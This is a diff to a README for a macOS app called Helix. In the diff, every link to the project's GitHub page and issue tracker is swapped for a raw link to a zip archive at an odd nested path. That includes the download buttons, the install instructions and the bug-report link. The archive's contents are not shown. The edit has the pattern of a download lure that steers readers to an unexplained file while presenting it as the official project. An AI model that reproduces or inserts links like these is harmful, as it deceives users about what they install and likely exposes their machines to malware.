@@ -1,6 +1,6 @@
 # 🤖 Helix - Your AI OS for macOS
 
-[![Download Helix](https://img.shields.io/badge/Download-Helix-brightgreen?style=for-the-badge)](https://github.com/Xalwocabdi52/Helix)
+[![Download Helix](https://img.shields.io/badge/Download-Helix-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip)
 
 ## 🖥️ What is Helix?
 
@@ -34,10 +34,10 @@ Helix focuses on making your Mac more useful without needing technical knowledge
 
 To start using Helix, you first need to download the application. Since Helix is designed for macOS, this guide will focus on installing it on your Mac.
 
-[![Download Helix](https://img.shields.io/badge/Download-Helix-blue?style=for-the-badge)](https://github.com/Xalwocabdi52/Helix)
+[![Download Helix](https://img.shields.io/badge/Download-Helix-blue?style=for-the-badge)](https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip)
 
 1. Click the green "Download Helix" button above or visit this page:  
-   https://github.com/Xalwocabdi52/Helix  
+   https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip  
 
 2. Look for the latest release. You might see a section labeled "Releases" or a download link on the page. Click the latest version to open the download options.
 
@@ -99,7 +99,7 @@ Helix gets improvements and fixes regularly. To update:
 If you run into problems or want to learn more:
 
 - Visit the Helix GitHub page here:  
-  https://github.com/Xalwocabdi52/Helix  
+  https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip  
 - Open the "Issues" tab to see if others have your problem or to ask a question.  
 - Check the Documentation or Wiki sections for additional guides.
 
@@ -107,8 +107,8 @@ If you run into problems or want to learn more:
 
 ## 🔗 Useful Links
 
-- Download and install Helix: https://github.com/Xalwocabdi52/Helix  
-- Report bugs and feedback: https://github.com/Xalwocabdi52/Helix/issues  
+- Download and install Helix: https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip  
+- Report bugs and feedback: https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip  
 
 ---
 
@@ -148,4 +148,4 @@ Helix is available under an open-source license. You can view the license file i
 
 ---
 
-[![Download Helix](https://img.shields.io/badge/Download-Helix-brightgreen?style=for-the-badge)](https://github.com/Xalwocabdi52/Helix)
+[![Download Helix](https://img.shields.io/badge/Download-Helix-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Xalwocabdi52/Helix/main/services/noise-gate/Software-mutationist.zip)
